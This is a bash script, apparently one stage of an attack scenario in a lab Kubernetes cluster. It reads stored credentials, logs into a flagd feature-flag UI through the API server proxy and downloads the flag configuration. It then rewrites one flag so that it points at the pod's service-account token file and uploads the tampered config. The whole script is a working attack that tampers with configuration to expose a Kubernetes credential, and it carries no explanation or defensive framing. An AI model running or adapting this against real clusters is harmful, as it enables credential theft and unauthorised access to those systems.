#!/usr/bin/env bash
set -euo pipefail

# ===== Config =====
API_SERVER="${API_SERVER:-https://kind-cluster-control-plane:6443}"
NSCREDS="${NSCREDS:-mem}"

FLAGHOST="flagd:4000"
TARGET_FLAG1="cryptoWord"
TARGET_FLAG2="exposedPath"
FNCREDS="$DATA_PATH/KC3/credentials"
PROXY_UI="$API_SERVER/api/v1/namespaces/$NSCREDS/services/$FLAGHOST/proxy"
COOKIEJAR="$DATA_PATH/KC3/flagd_ui_cookies.txt"
FILE_CONFIG="$DATA_PATH/KC3/flagd-config"

# Installing dependencies and setup
apt-get update >/dev/null 2>&1
apt-get install -y --no-install-recommends bash curl jq ca-certificates mawk >/dev/null 2>&1
mkdir -p $DATA_PATH/KC3

echo "Login in flagd"
mapfile -t CREDS < $FNCREDS
UI_USER="${CREDS[1]}"
UI_PASS="${CREDS[0]}"
curl -k -c "$COOKIEJAR" -sS -X POST "$PROXY_UI/feature/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$UI_USER\",\"password\":\"$UI_PASS\"}"

echo "Taking the config file"
COOKIE=$(awk '!/^#/ && $6!="" {print $6"="$7}' "$COOKIEJAR")
curl -k -sS \
  -H "Cookie: $COOKIE" \
  "$PROXY_UI/feature/api/read-file" | jq . > $FILE_CONFIG

echo "Modifying $TARGET_FLAG1 and $TARGET_FLAG2"
jq \
  --arg f "$TARGET_FLAG1" \
  --arg f2 "$TARGET_FLAG2" \
  '(.flags[$f].defaultVariant = "empty") 
   | (.flags[$f2].variants.log = "/var/run/secrets/kubernetes.io/serviceaccount/token")' \
  "$FILE_CONFIG" > "${FILE_CONFIG}.new"
mv "${FILE_CONFIG}.new" "$FILE_CONFIG"
  
curl -sSk -X POST "$PROXY_UI/feature/api/write-to-file" \
  -H "Cookie: $COOKIE" \
  -H "Content-Type: application/json" \
  --data "{\"data\": $(cat "$FILE_CONFIG")}"